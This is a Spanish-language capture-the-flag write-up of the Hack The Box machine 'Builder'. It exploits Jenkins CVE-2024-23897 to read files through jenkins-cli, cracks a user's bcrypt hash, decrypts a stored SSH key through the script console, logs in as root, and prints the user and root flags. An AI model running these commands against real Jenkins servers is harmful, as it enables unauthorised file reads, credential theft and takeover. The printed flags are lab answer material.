<div style="text-align:center;">
    <img src="https://0xdf.gitlab.io/icons/box-builder.png" alt="Descripción de la imagen">
</div>

***
- Source: https://app.hackthebox.com/machines/Builder
- OS: ``Linux``.
- Dificultad: ``Medium``.
- IP: `10.10.11.10`.
- Temas: `Jenkins,` `CVE-2024-23897,`, `Hashing`, `Arbitrary Read File`.
***

- Primero realizamos un escaneo de puertos a la máquina para tener una idea de donde podemos empezar:

~~~bash
❯ sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn -sV 10.10.11.10
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-04-17 14:09 EDT
NSE: Loaded 46 scripts for scanning.
Initiating SYN Stealth Scan at 14:09
Scanning 10.10.11.10 [65535 ports]
Discovered open port 22/tcp on 10.10.11.10
Discovered open port 8080/tcp on 10.10.11.10
Completed SYN Stealth Scan at 14:10, 32.30s elapsed (65535 total ports)
Initiating Service scan at 14:10
Scanning 2 services on 10.10.11.10
Completed Service scan at 14:10, 7.11s elapsed (2 services on 1 host)
NSE: Script scanning 10.10.11.10.
NSE: Starting runlevel 1 (of 2) scan.
Initiating NSE at 14:10
Completed NSE at 14:10, 2.36s elapsed
NSE: Starting runlevel 2 (of 2) scan.
Initiating NSE at 14:10
Completed NSE at 14:10, 2.62s elapsed
Nmap scan report for 10.10.11.10
Host is up, received user-set (4.0s latency).
Scanned at 2024-04-17 14:09:43 EDT for 45s
Not shown: 60364 closed tcp ports (reset), 5169 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE REASON         VERSION
22/tcp   open  ssh     syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
8080/tcp open  http    syn-ack ttl 62 Jetty 10.0.18
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 44.80 seconds
           Raw packets sent: 117441 (5.167MB) | Rcvd: 79433 (3.177MB)
~~~

- Tenemos dos servicios, un ``ssh`` por el puerto 22 y un ``http`` por el puerto 8080.
- Si visitamos este último podemos ver que la página es un `Jenkings` versión 2.441:

![Pasted image 20240417121828](https://github.com/JoseVazquez101/Writteups/assets/111292579/f895e90c-9d62-4851-b8a0-5a95b9dc8f59)

- Esto lo podemos confirmar con `whatweb`:

~~~bash
❯ whatweb http://10.10.11.10:8080/ -v
WhatWeb report for http://10.10.11.10:8080/
Status    : 200 OK
Title     : Dashboard [Jenkins]
IP        : 10.10.11.10
Country   : RESERVED, ZZ

Summary   : Cookies[JSESSIONID.a205034c], HTML5, HTTPServer[Jetty(10.0.18)], HttpOnly[JSESSIONID.a205034c], Jenkins['2.441'], Jetty[10.0.18], OpenSearch[/opensearch.xml], Script[application/json,text/javascript], UncommonHeaders[x-content-type-options,x-hudson-theme,referrer-policy,cross-origin-opener-policy,x-hudson,x-jenkins,x-jenkins-session,x-instance-identity], X-Frame-Options[sameorigin]
~~~

- Buscando un poco algunas vulnerabilidades encontré una bastante reciente, la cual se trata de una ``File Arbitrary Upload``:
	- https://github.com/Praison001/CVE-2024-23897-Jenkins-Arbitrary-Read-File-Vulnerability

- Esta se aprovecha de que versiones de Jenkins anteriores a esta no desactivan una función de su analizador de comandos CLI que reemplaza un carácter '@' seguido de una ruta de archivo en un argumento con el contenido del archivo.
- Esto permite a atacantes no autenticados leer archivos arbitrarios en el Sistema de archivos del controlador Jenkins.
- Si la ejecutamos veremos que podemos leer información del `/etc/passwd`:

~~~bash
❯ python3 PoC.py -u http://10.10.11.10:8080/ -f '/etc/passwd'
   _  _         _     _   _          ___ _       
 | || |__ _ __| |__ | |_| |_  ___  | _ \ |__ _ _ _  ___| |_ 
 | __ / _` / _| / / |  _| ' \/ -_) |  _/ / _` | ' \/ -_)  _|
 |_||_\__,_\__|_\_\  \__|_||_\___| |_| |_\__,_|_||_\___|\__|

Exploiting..
b'\x00\x00\x00\x00\x83\x08www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin: No such agent "www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin" exists.\n\x00\x00\x00Y\x08root:x:0:0:root:/root:/bin/bash: No such agent "root:x:0:0:root:/root:/bin/bash" exists.\n\x00\x00\x00q\x08mail:x:8:8:mail:/var/mail:/usr/sbin/nologin: No such agent "mail:x:8:8:mail:/var/mail:/usr/sbin/nologin" exists.\n\x00\x00\x00\x83\x08backup:x:34:34:backup:/var/backups:/usr/sbin/nologin: No such agent "backup:x:34:34:backup:/var/backups:/usr/sbin/nologin" exists.\n\x00\x00\x00y\x08_apt:x:42:65534::/nonexistent:/usr/sbin/nologin: No such agent "_apt:x:42:65534::/nonexistent:/usr/sbin/nologin" exists.\n\x00\x00\x00\x8f\x08nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin: No such agent "nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin" exists.\n\x00\x00\x00s\x08lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin: No such agent "lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin" exists.\n\x00\x00\x00\x81\x08uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin: No such agent "uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin" exists.\n\x00\x00\x00c\x08bin:x:2:2:bin:/bin:/usr/sbin/nologin: No such agent "bin:x:2:2:bin:/bin:/usr/sbin/nologin" exists.\n\x00\x00\x00}\x08news:x:9:9:news:/var/spool/news:/usr/sbin/nologin: No such agent "news:x:9:9:news:/var/spool/news:/usr/sbin/nologin" exists.\n\x00\x00\x00o\x08proxy:x:13:13:proxy:/bin:/usr/sbin/nologin: No such agent "proxy:x:13:13:proxy:/bin:/usr/sbin/nologin" exists.\n\x00\x00\x00s\x08irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin: No such agent "irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin" exists.\n\x00\x00\x00\x95\x08list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin: No such agent "list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin" exists.\n\x00\x00\x00{\x08jenkins:x:1000:1000::/var/jenkins_home:/bin/bash: No such agent "jenkins:x:1000:1000::/var/jenkins_home:/bin/bash" exists.\n\x00\x00\x00y\x08games:x:5:60:games:/usr/games:/usr/sbin/nologin: No such agent "games:x:5:60:games:/usr/games:/usr/sbin/nologin" exists.\n\x00\x00\x00y\x08man:x:6:12:man:/var/cache/man:/usr/sbin/nologin: No such agent "man:x:6:12:man:/var/cache/man:/usr/sbin/nologin" exists.\n\x00\x00\x00y\x08daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin: No such agent "daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin" exists.\n\x00\x00\x00c\x08sys:x:3:3:sys:/dev:/usr/sbin/nologin: No such agent "sys:x:3:3:sys:/dev:/usr/sbin/nologin" exists.\n\x00\x00\x00_\x08sync:x:4:65534:sync:/bin:/bin/sync: No such agent "sync:x:4:65534:sync:/bin:/bin/sync" exists.\n\x00\x00\x00\x01\x08\n\x00\x00\x00Q\x08ERROR: Error occurred while performing this command, see previous stderr output.\n\x00\x00\x00\x04\x04\x00\x00\x00\x05'
~~~

- Preferí hacer todo un poco más a mano, ya que al parecer podemos operar directamente con el propio archivo de cliente de Jenkins y esto nos permitirá realizar más cosas.
- (Créditos al creador de este repositorio por la info: https://github.com/CKevens/CVE-2024-23897)

- Por ejemplo, podemos ver como que usuario operamos, introduciendo el comando `who-am-i` de la propia herramienta:

~~~bash
❯ java -jar jenkins-cli.jar -s http://10.10.11.10:8080 who-am-i
Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
Authenticated as: anonymous
Authorities:
  anonymous
~~~

- Habíamos visto que el exploit empleaba un comando llamado `connect-node` seguido de un caracter `@` y nuestro archivo.
- Podemos replicar esto mismo desde aquí:

~~~bash
❯ java -jar jenkins-cli.jar -s http://10.10.11.10:8080 connect-node @/etc/passwd
Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin: No such agent "www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin" exists.
root:x:0:0:root:/root:/bin/bash: No such agent "root:x:0:0:root:/root:/bin/bash" exists.
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin: No such agent "mail:x:8:8:mail:/var/mail:/usr/sbin/nologin" exists.
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin: No such agent "backup:x:34:34:backup:/var/backups:/usr/sbin/nologin" exists.
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin: No such agent "_apt:x:42:65534::/nonexistent:/usr/sbin/nologin" exists.
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin: No such agent "nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin" exists.
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin: No such agent "lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin" exists.
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin: No such agent "uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin" exists.
bin:x:2:2:bin:/bin:/usr/sbin/nologin: No such agent "bin:x:2:2:bin:/bin:/usr/sbin/nologin" exists.
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin: No such agent "news:x:9:9:news:/var/spool/news:/usr/sbin/nologin" exists.
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin: No such agent "proxy:x:13:13:proxy:/bin:/usr/sbin/nologin" exists.
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin: No such agent "irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin" exists.
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin: No such agent "list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin" exists.
jenkins:x:1000:1000::/var/jenkins_home:/bin/bash: No such agent "jenkins:x:1000:1000::/var/jenkins_home:/bin/bash" exists.
games:x:5:60:games:/usr/games:/usr/sbin/nologin: No such agent "games:x:5:60:games:/usr/games:/usr/sbin/nologin" exists.
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin: No such agent "man:x:6:12:man:/var/cache/man:/usr/sbin/nologin" exists.
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin: No such agent "daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin" exists.
sys:x:3:3:sys:/dev:/usr/sbin/nologin: No such agent "sys:x:3:3:sys:/dev:/usr/sbin/nologin" exists.
sync:x:4:65534:sync:/bin:/bin/sync: No such agent "sync:x:4:65534:sync:/bin:/bin/sync" exists.

ERROR: Error occurred while performing this command, see previous stderr output.
~~~

- El contenido de este archivo no tiene pinta de ser un servidor normal.
- Podemos comprobar si es un docker viendo el `hostname` de este:

~~~bash
❯ java -jar jenkins-cli.jar -s http://10.10.11.10:8080 connect-node @/etc/hostname
Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true

ERROR: No such agent "0f52c222a4cc" exists.
~~~

- Y bueno, si es un docker al parecer.
- A esta altura lo que se me ocurrió fue investigar si existen archivos de configuración en Jenkins donde se almacene información confidencial hardcodeada como pueden ser archivos de configuración.
- Para esto, bajé una imagen de docker que use Jenkins, pueden encontrar las instrucciones aquí:
	- https://github.com/jenkinsci/docker

- Solo bastará con seguir los pasos requeridos para la instalación.
- Me creé un usuario llamado `retr0` en el docker, y realicé una búsqueda recursiva desde la raíz para buscar directorios que contuvieran mi nombre de usuario:

~~~bash
jenkins@45bfc2f75d6c:/$ grep -r "retr0" -l
jenkins_home/users/retr0_12888431285804654481/config.xml
jenkins_home/users/users.xml
~~~

- Con esto nos podemos dar una idea de como se estructura la data de los usuarios.

- Descubrí que existe en un archivo se almacena el nombre de los directorios de usuarios, al cual es `/var/jenkins_home/users/users.xml`.
- Si hacemos una petición a este en el servidor, podremos ver el directorio del usuario `jennifer`:

~~~bash
❯ java -jar jenkins-cli.jar -s http://10.10.11.10:8080 connect-node @/var/jenkins_home/users/users.xml
Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
<?xml version='1.1' encoding='UTF-8'?>: No such agent "<?xml version='1.1' encoding='UTF-8'?>" exists.
      <string>jennifer_12108429903186576833</string>: No such agent "      <string>jennifer_12108429903186576833</string>" exists.
  <idToDirectoryNameMap class="concurrent-hash-map">: No such agent "  <idToDirectoryNameMap class="concurrent-hash-map">" exists.
    <entry>: No such agent "    <entry>" exists.
      <string>jennifer</string>: No such agent "      <string>jennifer</string>" exists.
  <version>1</version>: No such agent "  <version>1</version>" exists.
</hudson.model.UserIdMapper>: No such agent "</hudson.model.UserIdMapper>" exists.
  </idToDirectoryNameMap>: No such agent "  </idToDirectoryNameMap>" exists.
<hudson.model.UserIdMapper>: No such agent "<hudson.model.UserIdMapper>" exists.
    </entry>: No such agent "    </entry>" exists.

ERROR: Error occurred while performing this command, see previous stderr output.
~~~

- Vemos que el nombre del directorio es `jennifer_12108429903186576833`, y dentro de este debe haber un archivo `config.xml`, el cual incluye la contraseña hasheada del usuario en cuestión:

~~~bash
❯ java -jar jenkins-cli.jar -s http://10.10.11.10:8080 connect-node @/var/jenkins_home/users/jennifer_12108429903186576833/config.xml
Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
    <hudson.tasks.Mailer_-UserProperty plugin="mailer@463.vedf8358e006b_">: No such agent "    <hudson.tasks.Mailer_-UserProperty plugin="mailer@463.vedf8358e006b_">" exists.

<----- TRASH ----->
      <passwordHash>#jbcrypt:$2a$10$UwR7BpEH.ccfpi1tv6w/XuBtS44S7oUpR2JYiobqxcDQJeN/L4l1a</passwordHash>: No such agent "      <passwordHash>#jbcrypt:$2a$10$UwR7BpEH.ccfpi1tv6w/XuBtS44S7oUpR2JYiobqxcDQJeN/L4l1a</passwordHash>" exists.

ERROR: Error occurred while performing this command, see previous stderr output.
~~~

- Podemos hackear el hash con `john`:

~~~bash
❯ john --wordlist=/usr/share/wordlists/rockyou.txt hash
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 1024 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
princess         (jbcrypt)     
1g 0:00:00:00 DONE (2024-04-17 17:00) 3.571g/s 128.5p/s 128.5c/s 128.5C/s 123456..liverpool
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
~~~

- Iniciamos sesión con estas credenciales en la página web y funcionó.
- Ahora bien, si nos vamos a `Administrar Jnekins > script console` veremos que podemos crear un script en `Groovy`:

![Pasted image 20240417151553](https://github.com/JoseVazquez101/Writteups/assets/111292579/ceb8d049-181a-40e2-816b-20297d1d1a6a)

- Ahora bien, intenté entablar una conexión pero no funcionó.
- Busqué más cosas en la página ahora que estaba autenticado para ver si encontraba otra forma potencial de ganar acceso, y encontré algo interesante.
- Encontré que en la dirección `Panel de Control > Administrar Jenkins > Credentials > System > Global credentials (unrestricted) > root` se guarda una especie de clave ssh para root.
- Si inspeccionamos el código fuente podemos ver la contraseña hardcodeada (xd), no sé porqué esto está así pero bueno:

![Pasted image 20240417154553](https://github.com/JoseVazquez101/Writteups/assets/111292579/6c4a2966-1bd2-4873-9e28-8df5bc2b2061)

- Investigué como desencriptar una contraseña de Jenkins y encontré esto:
	- https://devops.stackexchange.com/questions/2191/how-to-decrypt-jenkins-passwords-from-credentials-xml

- Aquí nos dicen que podemos hacerlo directamente desde la consola de Jenkins.
- Debemos introducir este comando, donde `{XXX=}` es nuestra clave:

~~~groovy
println(hudson.util.Secret.decrypt("{XXX=}"))
~~~

- Haciendo esto, tendríamos nuestra clave privada de SSH:

![Pasted image 20240417155444](https://github.com/JoseVazquez101/Writteups/assets/111292579/733550d3-b6fd-44fe-805f-62a55134d9f2)

- Le asignamos permisos a la llave:

~~~bash
❯ chmod 600 id_rsa
~~~

- Y accedemos como root:

~~~bash
❯ ssh root@10.10.11.10 -i id_rsa
Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-94-generic x86_64)

<----- TRASH ----->

The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Mon Feb 12 13:15:44 2024 from 10.10.14.40
root@builder:~# ls
~~~

- Saqué las flags y con esto concluiríamos la máquina:

~~~bash
root@builder:/home/jennifer# cat user.txt 
e24d936ab6e1cf380595e861cc0c495b
root@builder:/home/jennifer# cat /root/root.txt 
baf1da3ad9d7c8ae75b423bfee8307bc
~~~
